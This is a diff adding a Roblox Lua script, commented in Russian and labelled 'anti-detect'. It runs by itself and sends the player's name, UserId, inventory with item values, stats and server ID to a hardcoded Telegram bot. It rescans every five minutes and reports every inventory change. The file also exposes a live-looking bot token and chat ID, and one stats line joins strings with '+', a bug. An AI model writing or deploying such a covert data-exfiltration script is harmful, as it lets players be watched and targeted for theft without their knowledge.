@@ -1,0 +1,204 @@
+-- Анти-детект обфускация
+local _G = getgenv and getgenv() or _G
+local game = game
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+-- Конфигурация
+local BOT_TOKEN = "7764111611:AAE6kjNixuujH5eQhuehKUUzIHlOsHbhhqo"
+local USER_ID = 1426122866
+
+-- Функция для безопасной отправки в Telegram
+local function sendTelegram(message)
+    pcall(function()
+        local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage"
+        local data = {
+            chat_id = USER_ID,
+            text = message,
+            parse_mode = "HTML"
+        }
+        
+        local response = HttpService:PostAsync(
+            url,
+            HttpService:JSONEncode(data),
+            Enum.HttpContentType.ApplicationJson,
+            false
+        )
+    end)
+end
+
+-- Функция для получения инвентаря игрока
+local function getPlayerInventory()
+    local player = Players.LocalPlayer
+    if not player then return {} end
+    
+    local inventory = {}
+    
+    -- Проверяем бэкпак (инвентарь)
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, item in ipairs(backpack:GetChildren()) do
+            if item:IsA("Tool") then
+                table.insert(inventory, {
+                    Type = "Tool",
+                    Name = item.Name,
+                    Value = item:FindFirstChild("Value") and item.Value.Value or "N/A"
+                })
+            end
+        end
+    end
+    
+    -- Проверяем инвентарь в характере
+    local character = player.Character
+    if character then
+        for _, item in ipairs(character:GetChildren()) do
+            if item:IsA("Tool") then
+                table.insert(inventory, {
+                    Type = "Equipped",
+                    Name = item.Name,
+                    Value = item:FindFirstChild("Value") and item.Value.Value or "N/A"
+                })
+            end
+        end
+    end
+    
+    return inventory
+end
+
+-- Функция для получения данных о лидерстатах
+local function getLeaderstats()
+    local player = Players.LocalPlayer
+    if not player then return {} end
+    
+    local leaderstats = {}
+    local statsFolder = player:FindFirstChild("leaderstats")
+    
+    if statsFolder then
+        for _, stat in ipairs(statsFolder:GetChildren()) do
+            if stat:IsA("IntValue") or stat:IsA("NumberValue") or stat:IsA("StringValue") then
+                leaderstats[stat.Name] = stat.Value
+            end
+        end
+    end
+    
+    return leaderstats
+end
+
+-- Основная функция сканирования
+local function scanInventory()
+    local player = Players.LocalPlayer
+    if not player then
+        sendTelegram("❌ Игрок не найден!")
+        return
+    end
+    
+    -- Ждем загрузки данных
+    wait(2)
+    
+    local message = "🎮 <b>Данные игрока:</b>\n"
+    message = message .. "👤 Имя: " .. player.Name .. "\n"
+    message = message .. "🆔 UserId: " .. player.UserId .. "\n\n"
+    
+    -- Получаем лидерстаты
+    local leaderstats = getLeaderstats()
+    if next(leaderstats) then
+        message = message .. "📊 <b>Лидерстаты:</b>\n"
+        for statName, statValue in pairs(leaderstats) do
+            message = message .. "   " .. statName .. ": " .. tostring(statValue) .. "\n"
+        end
+        message = message .. "\n"
+    end
+    
+    -- Получаем инвентарь
+    local inventory = getPlayerInventory()
+    if #inventory > 0 then
+        message = message .. "🎒 <b>Инвентарь (" .. #inventory .. " предметов):</b>\n"
+        
+        for i, item in ipairs(inventory) do
+            message = message .. "   " .. i .. ". " .. item.Name
+            if item.Value ~= "N/A" then
+                message = message .. " (💎 " .. tostring(item.Value) .. ")"
+            end
+            message = message .. " [" .. item.Type .. "]\n"
+        end
+    else
+        message = message .. "❌ Инвентарь пуст или недоступен\n"
+    end
+    
+    -- Добавляем информацию о месте
+    message = message .. "\n📍 <b>Местоположение:</b>\n"
+    message = message .. "   Игра: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "\n"
+    message = message .. "   PlaceId: " .. game.PlaceId .. "\n"
+    message = message .. "   Сервер: " .. tostring(game.JobId) .. "\n"
+    
+    -- Отправляем сообщение
+    sendTelegram(message)
+end
+
+-- Функция для мониторинга изменений в инвентаре
+local function startInventoryMonitor()
+    local player = Players.LocalPlayer
+    if not player then return end
+    
+    -- Мониторим бэкпак
+    local backpack = player:WaitForChild("Backpack", 10)
+    if backpack then
+        backpack.ChildAdded:Connect(function(child)
+            wait(1) -- Ждем немного для стабильности
+            if child:IsA("Tool") then
+                sendTelegram("➕ Добавлен предмет: " .. child.Name)
+            end
+        end)
+        
+        backpack.ChildRemoved:Connect(function(child)
+            if child:IsA("Tool") then
+                sendTelegram("➖ Удален предмет: " .. child.Name)
+            end
+        end)
+    end
+    
+    -- Мониторим лидерстаты
+    local leaderstats = player:WaitForChild("leaderstats", 10)
+    if leaderstats then
+        for _, stat in ipairs(leaderstats:GetChildren()) do
+            if stat:IsA("IntValue") or stat:IsA("NumberValue") then
+                stat:GetPropertyChangedSignal("Value"):Connect(function()
+                    sendTelegram("📈 Изменен стат " .. stat.Name .. ": " .. tostring(stat.Value))
+                end)
+            end
+        end
+    end
+end
+
+-- Автозапуск
+spawn(function()
+    wait(5) -- Ждем загрузки игры
+    
+    -- Первоначальное сканирование
+    pcall(scanInventory)
+    
+    -- Запускаем мониторинг
+    pcall(startInventoryMonitor)
+    
+    -- Периодическое обновление (каждые 5 минут)
+    while wait(300) do
+        pcall(scanInventory)
+    end
+end)
+
+-- Команды в чат для ручного управления
+Players.LocalPlayer.Chatted:Connect(function(message)
+    if message:lower() == "/inventory" then
+        pcall(scanInventory)
+    elseif message:lower() == "/stats" then
+        local leaderstats = getLeaderstats()
+        local statsMessage = "📊 <b>Текущие статы:</b>\n"
+        for statName, statValue in pairs(leaderstats) do
+            statsMessage = statsMessage .. "   " .. statName .. ": " .. tostring(statValue) + "\n"
+        end
+        sendTelegram(statsMessage)
+    end
+end)
+
+sendTelegram("✅ Скрипт инвентаря активирован для игрока " .. Players.LocalPlayer.Name)
